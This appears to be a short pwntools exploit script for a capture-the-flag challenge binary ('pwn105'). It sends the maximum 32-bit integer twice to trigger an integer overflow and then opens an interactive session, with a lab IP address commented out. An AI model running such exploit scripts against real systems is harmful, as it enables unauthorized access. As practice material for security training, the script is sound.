from pwn import *

context.binary = e = ELF('./pwn105-1644300421555.pwn105')
io = process('./pwn105-1644300421555.pwn105')
# io = remote('10.48.142.99', '9005')

io.sendline(b'2147483647')
io.sendline(b'2147483647')
io.interactive()